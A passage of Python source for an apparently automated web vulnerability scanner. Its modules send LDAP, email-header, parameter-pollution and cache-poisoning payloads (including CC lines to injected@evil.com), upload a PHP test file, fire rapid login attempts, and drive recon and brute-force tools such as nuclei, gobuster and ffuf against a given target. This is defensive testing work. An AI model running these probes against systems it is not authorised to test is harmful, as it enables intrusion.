            # Check for progressive slowdown (soft rate limiting via delay)
            if not got_rate_limited and len(timings) >= 5:
                early_avg  = sum(timings[:3]) / 3
                late_avg   = sum(timings[-3:]) / 3
                got_rate_limited = late_avg > early_avg * 2.5 and late_avg > 2.0

            if not got_rate_limited and codes:
                logger.log("RATE-LIMIT",
                           f"No rate limiting on {path} (10 attempts, codes: {set(codes)})",
                           "WARNING")
                findings.append(make_finding("rate_limit",
                    f"No Rate Limiting on {path}", "Medium",
                    f"10 rapid authentication attempts to {path} returned no 429 response. "
                    f"Status codes seen: {sorted(set(codes))}. "
                    f"No rate-limit headers detected.",
                    "Implement rate limiting: max 5-10 auth attempts per IP per minute. "
                    "Add progressive delays. Implement account lockout after N failures. "
                    "Use CAPTCHA after 3 failures.",
                    url=url, cwe="CWE-307", confidence="Medium",
                    evidence=f"codes={sorted(set(codes))}, no 429 in 10 attempts"))

        except Exception:
            pass
    return findings


def module_ldap_injection(target,session):
    """A03: Detect LDAP injection vulnerability."""
    findings=[]; logger.log("LDAP","LDAP injection …")
    PAYLOADS=["*)(uid=*))(|(uid=*","*)(|(password=*)","admin)(&(password=*","*(|(cn=*)"]
    INDS=["LDAP","ldap","slapd","OpenLDAP","Microsoft AD",
          "Size limit exceeded","ldap_search","cn=","dc=","ou="]
    FUZZ=["username","user","email","login","q","search","uid","cn"]
    params=list(dict.fromkeys(extract_params(target)+FUZZ))[:MAX_PARAMS]
    try: bl=session.get(target,timeout=TIMEOUT)
    except: return findings
    for p in params:
        for pl in PAYLOADS[:3]:
            try:
                resp=session.get(inject_param(target,p,pl),timeout=TIMEOUT)
                for ind in INDS:
                    if ind in resp.text and ind not in bl.text:
                        findings.append(make_finding("ldap_injection",
                            f"LDAP Injection in '{p}'","High",
                            f"LDAP-related indicator '{ind}' appeared with injection payload.",
                            "Escape LDAP special characters; use parameterised LDAP queries.",
                            url=inject_param(target,p,pl),payload=pl,
                            cwe="CWE-90",confidence="Medium")); return findings
            except: pass
    return findings

# ── A03 — EMAIL HEADER INJECTION ──────────────────────────────────────────────
def module_email_injection(target,session):
    """A03: Detect email header injection in form fields."""
    findings=[]; logger.log("EMAIL-INJ","Email header injection …")
    PAYLOADS=["\r\nCC: injected@evil.com","\nBCC: injected@evil.com",
              "%0d%0aCC: injected@evil.com","%0aTo: injected@evil.com"]
    EMAIL_PARAMS=["email","from","to","subject","name","message","contact","reply_to"]
    params=list(dict.fromkeys(extract_params(target)+EMAIL_PARAMS))[:MAX_PARAMS]
    for p in params:
        for pl in PAYLOADS[:2]:
            try:
                resp=session.get(inject_param(target,p,pl+"@test.com"),timeout=TIMEOUT)
                # FP guard: success message must appear without error
                success_inds=["sent","submitted","thank","received","confirm","success"]
                if any(s in resp.text.lower() for s in success_inds) and resp.status_code==200:
                    findings.append(make_finding("email_injection",
                        f"Email Header Injection in '{p}'","Medium",
                        f"Injection payload in '{p}' may reach email headers.",
                        "Strip CR/LF from email fields. Validate email addresses strictly.",
                        url=inject_param(target,p,pl+"@test.com"),payload=pl,
                        cwe="CWE-93",confidence="Low"))
                    break
            except: pass
    return findings

# ── A03/A05 — HTTP PARAMETER POLLUTION ────────────────────────────────────────
def module_hpp(target,session):
    """A03: HTTP Parameter Pollution — duplicate params with different values."""
    findings=[]; logger.log("HPP","HTTP parameter pollution …")
    params=extract_params(target)[:MAX_PARAMS]
    if not params: return findings
    for p in params[:3]:
        try:
            qs=parse_qs(urlparse(target).query)
            orig=qs.get(p,[""])[0]
            # Build URL with duplicate param
            evil_url=target+f"&{p}=evil_hpp_value"
            bl=session.get(target,timeout=TIMEOUT)
            r=session.get(evil_url,timeout=TIMEOUT)
            # FP guard: response must differ and "evil_hpp_value" must appear
            if "evil_hpp_value" in r.text and r.text!=bl.text:
                findings.append(make_finding("hpp",f"HTTP Parameter Pollution in '{p}'","Low",
                    f"Duplicate '{p}' parameter causes different response. May affect logic.",
                    "Define explicit precedence for duplicate parameters. Use input allowlists.",
                    url=evil_url,payload=f"{p}=evil_hpp_value",
                    cwe="CWE-235",confidence="Medium")); break
        except: pass
    return findings

# ── A05 — WEB CACHE POISONING ─────────────────────────────────────────────────
def module_cache_poisoning(target, session):
    """
    A05/T1557: Cache poisoning — zero-FP via:
    1. Use two DIFFERENT cache-busters on two requests
    2. Header value must appear in BOTH responses (consistent poisoning)
    3. Header value must NOT appear in a clean baseline request
    4. Verify with a third request WITHOUT the poison header (confirms caching)
    """
    findings = []
    UNKEYED_HEADERS = [
        ("X-Forwarded-Host",  "evil-cache-dd5.com"),
        ("X-Forwarded-Scheme","nothttps"),
        ("X-Original-URL",    "/dd-cache-test"),
        ("X-Forwarded-For",   "evil-cache-dd5.com"),
    ]
    import hashlib as _hs
    ts = str(time.time())

    for hdr, val in UNKEYED_HEADERS:
        try:
            bust1 = _hs.md5((ts+"a").encode()).hexdigest()[:8]
            bust2 = _hs.md5((ts+"b").encode()).hexdigest()[:8]
            sep   = "&" if "?" in target else "?"

            # Gate 1: baseline must NOT contain poison value
            bl = session.get(target + sep + "__cb0=" + bust1, timeout=TIMEOUT)
            if not bl or val in bl.text: continue

            # Gate 2: two poisoned requests must both reflect
            r1 = session.get(target + sep + "__cb1=" + bust1,
                             headers={hdr: val}, timeout=TIMEOUT)
            r2 = session.get(target + sep + "__cb2=" + bust2,
                             headers={hdr: val}, timeout=TIMEOUT)
            if not r1 or not r2: continue
            if val not in r1.text or val not in r2.text: continue

            # Gate 3: clean follow-up request (no poison header) should NOT contain val
            # (if it does, the site is already echoing that value regardless)
            r3 = session.get(target + sep + "__cb3=" + bust2, timeout=TIMEOUT)
            if r3 and val in r3.text: continue  # Echoes without poison → FP

            logger.log("CACHE-POISON", f"Cache poisoning vector confirmed: {hdr}", "WARNING")
            findings.append(make_finding("cache_poison",
                f"Web Cache Poisoning via '{hdr}'", "Medium",
                f"Header '{hdr}: {val}' reflected in 2/2 requests and absent from clean baseline. "
                f"If cached, malicious value could be served to all users.",
                "Add unkeyed headers to cache key or strip them at edge. "
                "Implement 'Vary' header for all custom headers.",
                url=target, payload=f"{hdr}: {val}",
                cwe="CWE-601", confidence="Medium",
                evidence=f"Reflected in both {bust1} and {bust2} requests"))
            break

        except Exception:
            pass
    return findings


def module_file_upload(target,session):
    """A04: Detect insecure file upload endpoints."""
    findings=[]; logger.log("FILE-UPLOAD","File upload check …")
    UPLOAD_PATHS=["/upload","/api/upload","/file/upload","/media/upload",
                  "/api/v1/upload","/files/upload","/attachments","/media"]
    DANGEROUS_EXTS=[".php",".asp",".aspx",".jsp",".py",".rb",".sh",".pl"]
    for path in UPLOAD_PATHS:
        url=target.rstrip("/")+path
        try:
            # Check if endpoint exists
            r=session.get(url,timeout=TIMEOUT)
            if r.status_code not in(200,405,415): continue
            if r.status_code==200 and len(r.text)<50: continue
            # Try uploading a test PHP file (content only, no shell)
            for ext in [".php",".php5",".phtml"]:
                test_content=f"<?php echo 'dd_upload_test_{ext[1:]}'; ?>"
                files={"file":(f"test_dd{ext}",test_content,"application/octet-stream")}
                r2=session.post(url,files=files,timeout=TIMEOUT)
                if r2.status_code in(200,201):
                    # FP guard: response must not be a generic error
                    if any(e in r2.text.lower() for e in["invalid","not allowed","blocked","forbidden","error type"]): continue
                    # Look for URL in response (upload succeeded)
                    uploaded_url=re.search(r'(?:url|path|src|href)[\s:="\']+(.*?(?:php|asp|jsp))',r2.text,re.I)
                    if uploaded_url or "success" in r2.text.lower() or r2.status_code==201:
                        logger.log("FILE-UPLOAD",f"Dangerous ext {ext} accepted at {path}","CRITICAL")
                        findings.append(make_finding("file_upload",
                            f"Dangerous File Upload ({ext}) at {path}","Critical",
                            f"Server accepted {ext} file at {path}. Webshell upload may be possible.",
                            "Whitelist file extensions. Validate content-type. Store outside webroot.",
                            url=url,payload=f"test_dd{ext}",
                            cwe="CWE-434",confidence="Medium")); break
        except: pass
    return findings

# ── A07 — OAUTH / OIDC MISCONFIGURATION ───────────────────────────────────────
def module_oauth_oidc(target,session):
    """A07: Detect OAuth/OIDC misconfigurations."""
    findings=[]; logger.log("OAUTH","OAuth/OIDC misconfiguration check …")
    # Check for OIDC discovery endpoints
    for ep in ["/.well-known/openid-configuration","/.well-known/oauth-authorization-server",
               "/oauth/.well-known/openid-configuration","/auth/realms"]:
        url=target.rstrip("/")+ep
        try:
            r=session.get(url,timeout=TIMEOUT)
            if r.status_code==200 and ("issuer" in r.text or "authorization_endpoint" in r.text):
                logger.log("OAUTH",f"OIDC config at {ep}","SUCCESS")
                try:
                    conf=json.loads(r.text)
                    issues=[]
                    # Check for insecure grant types
                    grants=conf.get("grant_types_supported",[])
                    if "implicit" in grants: issues.append("Implicit grant type enabled (deprecated)")
                    if "password" in grants: issues.append("Password grant type enabled (insecure)")
                    # Check response types
                    rtypes=conf.get("response_types_supported",[])
                    if "token" in rtypes: issues.append("Token response type (implicit flow)")
                    # Check PKCE
                    if "S256" not in conf.get("code_challenge_methods_supported",["S256"]):
                        issues.append("PKCE not enforced")
                    if issues:
                        for issue in issues:
                            findings.append(make_finding("oauth_oidc",
                                f"OAuth Misconfiguration: {issue}","Medium",
                                f"OIDC config at {ep}: {issue}",
                                "Disable implicit/password grants. Enforce PKCE (S256).",
                                url=url,cwe="CWE-347",confidence="High"))
                    else:
                        findings.append(make_finding("oauth_oidc","OIDC Config Exposed","Info",
                            f"OIDC discovery endpoint exposed at {ep}.",
                            "Ensure no sensitive grant types are enabled.",url=url))
                except: pass
        except: pass
    # Check for authorization code without state param
    for ep in ["/oauth/authorize","/auth/authorize","/connect/authorize"]:
        url=target.rstrip("/")+ep+"?response_type=code&client_id=test"
        try:
            r=session.get(url,timeout=TIMEOUT,allow_redirects=False)
            if r.status_code in(302,301):
                loc=r.headers.get("Location","")
                if "code=" in loc and "state=" not in loc:
                    findings.append(make_finding("oauth_oidc","OAuth Missing State Parameter","Medium",
                        "Auth redirect issued without 'state' parameter — CSRF risk.",
                        "Always require state parameter in OAuth flows.",
                        url=url,cwe="CWE-352",confidence="Medium"))
        except: pass
    return findings

# ── A09 — LOGGING & MONITORING ────────────────────────────────────────────────
def module_logging_monitoring(target,session):
    """A09: Detect indicators of missing security logging."""
    findings=[]; logger.log("LOGGING","Logging & monitoring check …")
    resp=safe_get(session,target)
    if not resp: return findings
    # Check for security event header indicators
    LOGGING_HEADERS=["x-request-id","x-correlation-id","x-trace-id","x-b3-traceid"]
    has_logging_header=any(h in str(resp.headers).lower() for h in LOGGING_HEADERS)
    if not has_logging_header:
        findings.append(make_finding("logging","No Request Correlation ID Header","Low",
            "No X-Request-ID, X-Correlation-ID, or X-Trace-ID header found. "
            "May indicate missing distributed tracing/logging infrastructure.",
            "Implement request correlation IDs for all responses to enable security event tracing.",
            url=target,cwe="CWE-778",confidence="Low"))
    # Check: does the app return different info on repeated wrong-path requests?
    rnd1=hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
    rnd2=hashlib.md5(str(time.time()+1).encode()).hexdigest()[:6]
    try:
        r1=session.get(target.rstrip("/")+f"/nonexistent-{rnd1}",timeout=TIMEOUT)
        r2=session.get(target.rstrip("/")+f"/nonexistent-{rnd2}",timeout=TIMEOUT)
        if r1.status_code==200 and r2.status_code==200:
            # Both non-existent paths return 200 — may indicate weak error handling
            findings.append(make_finding("logging","Non-Existent Paths Return 200","Low",
                "Random non-existent paths return HTTP 200. May indicate missing 404 handling.",
                "Return proper 404 for non-existent resources.",url=target,cwe="CWE-209"))
    except: pass
    return findings

# ── A05 — SPF/DMARC/DKIM ─────────────────────────────────────────────────────
def module_spf_dmarc(target,session):
    """A05: Check email security records (SPF, DMARC, DKIM)."""
    findings=[]; logger.log("SPF-DMARC","Email security record check …")
    domain=get_domain(target)
    # Check SPF
    try:
        import subprocess
        spf=subprocess.run(["dig","+short","TXT",domain],capture_output=True,text=True,timeout=10)
        if spf.returncode==0:
            if "v=spf1" not in spf.stdout:
                findings.append(make_finding("spf_dmarc","Missing SPF Record","Medium",
                    f"No SPF record found for {domain}. Domain can be spoofed in emails.",
                    "Add SPF TXT record to DNS: v=spf1 include:... -all",
                    url=target,cwe="CWE-290",confidence="High"))
            elif "-all" not in spf.stdout and "~all" not in spf.stdout:
                findings.append(make_finding("spf_dmarc","Weak SPF Policy","Low",
                    "SPF record uses '+all' or '?all' — too permissive.",
                    "Use '-all' (hard fail) in SPF record.",url=target,cwe="CWE-290"))
        # Check DMARC
        dmarc=subprocess.run(["dig","+short","TXT",f"_dmarc.{domain}"],
                             capture_output=True,text=True,timeout=10)
        if dmarc.returncode==0:
            if "v=DMARC1" not in dmarc.stdout:
                findings.append(make_finding("spf_dmarc","Missing DMARC Record","Medium",
                    f"No DMARC record for {domain}.",
                    "Add DMARC TXT record: _dmarc.domain TXT v=DMARC1; p=reject; ...",
                    url=target,cwe="CWE-290",confidence="High"))
            elif "p=none" in dmarc.stdout:
                findings.append(make_finding("spf_dmarc","DMARC Policy Set to 'none'","Low",
                    "DMARC p=none — monitoring only, no enforcement.",
                    "Change DMARC policy to p=quarantine or p=reject.",url=target,cwe="CWE-290"))
    except: pass
    return findings

# ── A01 — SUBDOMAIN TAKEOVER ──────────────────────────────────────────────────
def module_subdomain_takeover(subdomains,session):
    findings=[]; logger.log("TAKEOVER","Subdomain takeover checks …")
    SIGS={"GitHub Pages":["There isn't a GitHub Pages site here"],
          "Heroku":["No such app"],
          "AWS S3":["NoSuchBucket","The specified bucket does not exist"],
          "Fastly":["Fastly error: unknown domain"],
          "Netlify":["Not Found - Request ID"],
          "Vercel":["The deployment you are looking for"],
          "Shopify":["Sorry, this shop is currently unavailable"],
          "Azure":["404 web site not found"],
          "SendGrid":["The domain you are attempting"]}
    for sub in subdomains[:50]:
        url=f"http://{sub}" if not sub.startswith("http") else sub
        try:
            r=session.get(url,timeout=5,allow_redirects=True)
            for provider,sigs in SIGS.items():
                if any(s.lower() in r.text.lower() for s in sigs):
                    logger.log("TAKEOVER",f"Possible takeover: {sub} ({provider})","CRITICAL")
                    findings.append(make_finding("takeover",
                        f"Potential Subdomain Takeover — {provider}","High",
                        f"{sub} shows {provider} dangling indicator.",
                        "Claim resource on provider or remove DNS record.",
                        url=url,cwe="CWE-350",confidence="Medium"))
        except: pass
    return findings

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════  EXTERNAL TOOL WRAPPERS  ═════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

def tool_subfinder(domain):
    """SubFinder v2.6+ — all sources, recursive."""
    subs = []
    if not find_bin("subfinder"): return [], subs
    logger.log("SUBFINDER", f"Subdomain enum: {domain}", "TOOL")
    out = run_cmd([
        "subfinder",
        "-d",        domain,
        "-silent",
        "-all",              # all passive sources
        "-recursive",        # recursive enumeration
        "-timeout",  "30",
        "-max-time", "300",
    ], timeout=320)
    if out and out not in ("TIMEOUT", "NOT_FOUND", ""):
        subs = [s.strip() for s in out.splitlines()
                if s.strip() and "." in s.strip()]
        logger.log("SUBFINDER", f"Found {len(subs)} subdomains", "SUCCESS")
    return [], subs


def tool_amass(domain):
    subs=[]
    if not find_bin("amass"): return [],subs
    logger.log("AMASS",f"Amass: {domain}","TOOL")
    out=run_cmd(["amass","enum","-passive","-d",domain,"-timeout","3"],timeout=300)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        subs=[s.strip() for s in out.splitlines() if domain in s and s.strip()]
    return [],subs

def tool_sublist3r(domain):
    subs=[]; script=TOOLS_DIR/"sublist3r"/"sublist3r.py"
    if not script.exists(): return [],subs
    logger.log("SUBLIST3R",f"Sublist3r: {domain}","TOOL")
    out=run_cmd([sys.executable,str(script),"-d",domain,"-n"],timeout=180)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        subs=[l.strip() for l in out.splitlines() if domain in l and not l.startswith("[")]
    return [],subs

def tool_dnsx(subdomains, workdir):
    """DNSX v1.2+ — with wildcard filtering."""
    if not find_bin("dnsx") or not subdomains: return []
    logger.log("DNSX", f"Resolving {len(subdomains)} subdomains", "TOOL")
    inp = workdir / "dnsx_in.txt"
    out = workdir / "dnsx_out.txt"
    inp.write_text("\n".join(subdomains))
    run_cmd([
        "dnsx",
        "-l",        str(inp),
        "-silent",
        "-o",        str(out),
        "-a",                  # resolve A records
        "-aaaa",               # resolve AAAA records
        "-cname",              # resolve CNAME (for takeover detection)
        "-resp",               # show response
        "-retry",   "2",
        "-t",       "50",      # threads
        "-wd",      subdomains[0].split(".")[-2] + "." + subdomains[0].split(".")[-1]
                    if len(subdomains[0].split(".")) >= 2 else "",  # wildcard detect
    ], timeout=180)
    try:
        if not out.exists(): return []
        return [l.strip() for l in out.read_text(errors="ignore").splitlines()
                if l.strip()]
    except Exception:
        return []


def tool_httpx(hosts, workdir):
    """HTTPX v1.6+ — enriched output with tech detection."""
    if not find_bin("httpx") or not hosts: return []
    logger.log("HTTPX", f"Probing {len(hosts)} hosts", "TOOL")
    inp = workdir / "httpx_in.txt"
    out = workdir / "httpx_out.txt"
    inp.write_text("\n".join(hosts))
    run_cmd([
        "httpx",
        "-l",              str(inp),
        "-silent",
        "-o",              str(out),
        "-mc",             "200,301,302,401,403,405",
        "-follow-redirects",
        "-title",                # extract page title
        "-tech-detect",          # tech stack detection
        "-web-server",           # server header
        "-status-code",
        "-no-color",
        "-timeout",        "10",
        "-threads",        "50",
        "-retries",        "1",
    ], timeout=240)
    if out.exists():
        try:
            live = [l.strip() for l in out.read_text(errors="ignore").splitlines()
                    if l.strip().startswith("http")]
            logger.log("HTTPX", f"Live: {len(live)}", "SUCCESS")
            return live
        except Exception:
            pass
    return []


def tool_naabu(target):
    findings=[]
    if not find_bin("naabu"): return findings
    domain=get_domain(target); logger.log("NAABU",f"Port scan: {domain}","TOOL")
    out=run_cmd(["naabu","-host",domain,"-top-ports","1000","-silent","-nc"],timeout=300)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        RISKY={"21","22","23","25","110","143","445","1433","3306","3389","5432","5900","6379","27017"}
        for port in set(re.findall(r":(\d+)$",out,re.M)):
            sev="High" if port in RISKY else "Info"
            findings.append(make_finding("recon",f"Open Port: {port}",sev,
                f"Port {port} open on {domain}.","Verify intended public.",
                url=f"http://{domain}:{port}",tool="naabu"))
    return findings

def tool_wafw00f(target):
    findings=[]
    if not find_bin("wafw00f"): return findings
    logger.log("WAFW00F","WAF detection","TOOL")
    out=run_cmd(["wafw00f",target,"-a","-o","-"],timeout=60)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        for line in out.splitlines():
            if "is behind" in line.lower() or "detected" in line.lower():
                findings.append(make_finding("waf",f"WAF: {line.strip()[:70]}","Info",
                    line.strip(),"Ensure WAF is tuned.",url=target,tool="wafw00f"))
    return findings

def tool_nikto(target):
    findings=[]
    if not find_bin("nikto"): return findings
    logger.log("NIKTO","Nikto web scan","TOOL")
    out=run_cmd(["nikto","-h",target,"-maxtime","120s","-nointeractive"],timeout=130)
    if out and out not in("TIMEOUT","NOT_FOUND"):
        for cve in set(re.findall(r"CVE-\d{4}-\d+",out)):
            findings.append(make_finding("recon",f"CVE: {cve}","High",
                f"Nikto: {cve}.","Patch immediately.",url=target,cwe=cve,tool="nikto"))
        for line in out.splitlines():
            if any(k in line for k in["+ OSVDB","potentially interesting","backup","login"]):
                if len(line.strip())>15:
                    findings.append(make_finding("info_disclosure",f"Nikto: {line.strip()[:90]}","Low",
                        line.strip(),"Review.",url=target,tool="nikto"))
    return findings

def tool_nuclei(targets, workdir):
    """Nuclei v3.x — updated flags for 2025/2026."""
    findings = []
    if not find_bin("nuclei"): return findings
    logger.log("NUCLEI", f"Template scan: {len(targets)} targets", "TOOL")

    tf = workdir / "nuclei_targets.txt"
    tf.write_text("\n".join(targets))

    # Update templates (v3.2+ uses '-update', fallback to '-update-templates')
    for update_flag in ["-update", "-update-templates"]:
        try:
            subprocess.run(
                ["nuclei", update_flag],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=60, env={**os.environ, "PATH": _EXT_PATH})
            break
        except Exception:
            pass

    # v3.x scan with FP-reduction flags
    cmd = [
        "nuclei",
        "-l",          str(tf),
        "-severity",   "critical,high,medium",
        "-silent",
        "-nc",                    # no color
        "-no-color",
        "-timeout",    "10",
        "-retries",    "1",
        "-rate-limit", "50",      # FP reduction: limit rate
        "-bulk-size",  "25",
        "-concurrency","10",
        "-scan-strategy", "host-spray",  # v3+ flag
        "-stats",                 # show progress stats
    ]
    out = run_cmd(cmd, timeout=600)

    SEV_MAP = {"critical":"Critical","high":"High","medium":"Medium",
               "low":"Low","info":"Info"}
    seen = set()  # deduplication

    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        for line in out.splitlines():
            if not line.strip(): continue
            # v3 output: [template-id] [proto] [severity] url
            m = re.match(r"\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(\S+)", line.strip())
            if m:
                tmpl, proto, sev_raw, url = m.groups()
                sev  = SEV_MAP.get(sev_raw.lower(), "Medium")
                dedup_key = f"{tmpl}:{url}"
                if dedup_key in seen: continue
                seen.add(dedup_key)
                if sev == "Info": continue  # Skip info to reduce noise
                logger.log("NUCLEI",
                    f"[{sev}] {tmpl} @ {url[:60]}", "CRITICAL" if sev in ("Critical","High") else "WARNING")
                findings.append(make_finding("info_disclosure",
                    f"Nuclei: {tmpl}", sev,
                    f"Nuclei template [{tmpl}] triggered on {url}",
                    "Review nuclei template documentation for remediation.",
                    url=url, tool="nuclei", evidence=line.strip()[:200]))
    return findings


def tool_gobuster(target, workdir):
    """GoBuster v3.6+ — with FP-reduction flags."""
    findings = []
    if not find_bin("gobuster"): return findings
    WORDLISTS = [
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/wordlists/dirb/common.txt",
        str(workdir/"common.txt"),
    ]
    wl = next((w for w in WORDLISTS if os.path.exists(w)), None)
    if not wl:
        BUILTIN = ["admin","login","dashboard","api","v1","v2","backup","config",
                   "upload","test","dev","staging","phpmyadmin","adminer","wp-admin",
                   "phpinfo","server-status","debug","console","actuator","swagger",
                   "graphql","graphiql","docs",".git",".env","robots.txt",
                   "web.config","private","secret","exports","downloads"]
        wl_p = workdir/"common.txt"
        wl_p.write_text("\n".join(BUILTIN))
        wl = str(wl_p)

    logger.log("GOBUSTER", f"Dir brute: {target}", "TOOL")
    of = workdir / "gobuster_out.txt"

    # Get wildcard response size for FP reduction
    wildcard_size = None
    try:
        import hashlib as _h
        rnd = _h.md5(str(time.time()).encode()).hexdigest()[:12]
        wc  = safe_get(None, target.rstrip("/") + f"/{rnd}") if False else None
        # Manual request
        import requests as _rq
        wc = _rq.get(target.rstrip("/") + f"/{rnd}",
                     timeout=5, verify=False,
                     headers={"User-Agent": DEFAULT_UA})
        if wc.status_code == 200:
            wildcard_size = len(wc.text)
    except Exception:
        pass

    # Detect global redirect (HTTP→HTTPS for all paths = mass FP source)
    global_redirect = False
    try:
        import requests as _rq_gb
        rnd_gb = __import__('hashlib').md5(b'gobprobe').hexdigest()[:10]
        chk_gb = _rq_gb.get(target.rstrip("/") + f"/{rnd_gb}",
                            timeout=5, verify=False, allow_redirects=False,
                            headers={"User-Agent": DEFAULT_UA})
        if chk_gb.status_code in (301, 302):
            global_redirect = True
            logger.log("GOBUSTER",
                "Site redirects all paths — using -r to follow + filtering 301",
                "WARNING")
    except Exception:
        pass

    cmd = [
        "gobuster", "dir",
        "-u",  target,
        "-w",  wl,
        "-t",  "25",
        "--no-error",
        "-z",
        "-q",
        "-o",  str(of),
        "-b",  "301,302,404,429,503",  # filter redirects to prevent mass FPs
        "-x",  "php,asp,aspx,jsp,json,bak,conf,sql,zip",
        "--timeout", "10s",
    ]
    if global_redirect:
        cmd += ["-r"]  # follow redirects — require 200 at final destination
    if wildcard_size is not None:
        cmd += ["--exclude-length", str(wildcard_size)]

    run_cmd(cmd, timeout=300)

    if of.exists():
        seen_sizes = set()
        for line in of.read_text(errors="ignore").splitlines():
            m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)(?:.*?Size:\s*(\d+))?", line)
            if m:
                path, code, size = m.groups()
                # FP reduction: skip duplicate response sizes
                if size and size in seen_sizes: continue
                if size: seen_sizes.add(size)
                sev = ("Critical" if any(k in path for k in
                                         ["phpmyadmin","adminer","console","actuator/env","heapdump"])
                       else "High" if any(k in path for k in
                                          ["admin","config","backup","debug","graphiql","h2-console"])
                       else "Medium" if code in ("200","201")
                       else "Low")
                findings.append(make_finding("sensitive_files",
                    f"Content Found: {path} [{code}]", sev,
                    f"GoBuster discovered {path} (HTTP {code})",
                    "Review and restrict sensitive paths.",
                    url=target.rstrip("/") + path, tool="gobuster"))
    return findings


def tool_ffuf(target, workdir):
    """ffuf v2.x — with response filtering for FP reduction."""
    findings = []
    if not find_bin("ffuf"): return findings
    WORDLISTS = [
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/wordlists/dirb/common.txt",
        str(workdir/"common.txt"),
    ]
    wl = next((w for w in WORDLISTS if os.path.exists(w)), None)
    if not wl: return findings

    logger.log("FFUF", f"Content discovery: {target}", "TOOL")
    of = workdir / "ffuf_out.json"

    # Get baseline response size for filtering
    baseline_size = 0
    try:
        import requests as _rq
        bl = _rq.get(target.rstrip("/") + "/dd_nonexistent_ffuf_probe",
                     timeout=5, verify=False,
                     headers={"User-Agent": DEFAULT_UA})
        if bl.status_code == 200:
            baseline_size = len(bl.content)
    except Exception:
        pass

    # Detect baseline redirect pattern (global HTTP→HTTPS redirect = all paths return 301)
    baseline_redirect_size = None
    try:
        import requests as _rq2
        rnd2 = __import__('hashlib').md5(b'probe2').hexdigest()[:10]
        chk  = _rq2.get(target.rstrip("/") + f"/{rnd2}",
                        timeout=5, verify=False, allow_redirects=False,
                        headers={"User-Agent": DEFAULT_UA})
        if chk.status_code in (301, 302):
            # Site redirects everything — filter 301/302 entirely
            baseline_redirect_size = len(chk.content)
    except Exception:
        pass

    cmd = [
        "ffuf",
        "-u",        target.rstrip("/") + "/FUZZ",
        "-w",        wl,
        "-o",        str(of),
        "-of",       "json",
        "-mc",       "200,201,204,401,403",  # EXCLUDE 301/302 — they cause mass FPs
        "-t",        "30",
        "-s",
        "-timeout",  "10",
        "-ac",       # auto-calibrate filtering
        "-r",        # follow redirects — require FINAL destination to be 200
    ]
    # Filter exact wildcard response size
    if baseline_size > 0:
        cmd += ["-fs", str(baseline_size)]
    # If ALL paths redirect, skip ffuf entirely (would produce zero real results anyway)
    if baseline_redirect_size is not None:
        logger.log("FFUF", "Site redirects all paths — skipping ffuf to avoid mass FPs", "WARNING")
        return findings

    run_cmd(cmd, timeout=300)

    seen_sizes = set()
    if of.exists():
        try:
            data = json.loads(of.read_text(errors="ignore"))
            for r in data.get("results", []):
                path   = "/" + r.get("input", {}).get("FUZZ","")
                code   = r.get("status", 0)
                size   = r.get("length", 0)
                words  = r.get("words", 0)

                # Skip duplicate sizes (same response for everything = wildcard)
                if size in seen_sizes: continue
                seen_sizes.add(size)
                if size < 10: continue  # Empty responses

                findings.append(make_finding("sensitive_files",
                    f"ffuf: {path} [{code}]",
                    "Medium" if code in (200,201,204) else "Low",
                    f"ffuf found {path} (HTTP {code}, {size} bytes, {words} words)",
                    "Review; restrict if sensitive.",
                    url=target.rstrip("/") + path, tool="ffuf"))
        except Exception:
            pass
    return findings


def tool_gau(domain,workdir):
    if not find_bin("gau"): return []
    logger.log("GAU",f"Archived URLs: {domain}","TOOL")
    out=run_cmd(["gau","--subs",domain,"--blacklist","png,jpg,gif,css,woff,ico,svg",
                 "--timeout","30"],timeout=180)
    try:
        if out and out not in("TIMEOUT","NOT_FOUND",""):
            return list(set(l.strip() for l in out.splitlines()
                            if l.strip().startswith("http") and domain in l))[:150]
    except Exception: pass
    return []

def tool_waybackurls(domain):
    if not find_bin("waybackurls"): return []
    logger.log("WAYBACK",f"Wayback: {domain}","TOOL")
    out=run_cmd(["waybackurls",domain],timeout=120)
    try:
        if out and out not in("TIMEOUT","NOT_FOUND",""):
            return list(set(l.strip() for l in out.splitlines()
                            if l.strip().startswith("http")))[:100]
    except Exception: pass
    return []

def tool_gospider(target,workdir):
    if not find_bin("gospider"): return []
    logger.log("GOSPIDER",f"Spider: {target}","TOOL")
    out=run_cmd(["gospider","-s",target,"-c","5","-d","2","--no-redirect","-q"],timeout=180)
    urls = []
    try:
        if out and out not in("TIMEOUT","NOT_FOUND",""):
            for line in out.splitlines():
                m = re.search(r"\[url\] - \[.*?\] - (https?://\S+)", line)
                if m: urls.append(m.group(1))
    except Exception: pass
    return list(set(urls))

def tool_katana(target, workdir):
    """Katana v1.1+ — JS crawling + known-file discovery."""
    if not find_bin("katana"): return []
    logger.log("KATANA", f"Katana: {target}", "TOOL")
    of = workdir / "katana_out.txt"
    run_cmd([
        "katana",
        "-u",        target,
        "-d",        "3",
        "-silent",
        "-nc",
        "-o",        str(of),
        "-timeout",  "10",
        "-jc",               # JavaScript crawling
        "-kf",               # known-file crawling (robots.txt, sitemap.xml)
        "-aff",              # automatic form filling
        "-fx",               # filter extensions (media files)
        "-ef",   "png,jpg,jpeg,gif,ico,svg,woff,woff2,ttf,eot,mp4,mp3,zip,pdf",
    ], timeout=240)
    try:
        if not of.exists(): return []
        data = of.read_text(errors="ignore")
        return list(set(
            l.strip() for l in data.splitlines()
            if l.strip().startswith("http")
        ))
    except Exception:
        return []


def tool_arjun(target,workdir):
    findings,params=[],[]
    logger.log("ARJUN",f"Param discovery: {target}","TOOL")
    of=workdir/"arjun_out.json"
    cmd=(["arjun","-u",target,"--export-format","json","--output",str(of),"-q"]
         if find_bin("arjun") else
         [sys.executable,"-m","arjun","-u",target,"--export-format","json","--output",str(of),"-q"])
    out=run_cmd(cmd,timeout=180)
    if of.exists():
        try:
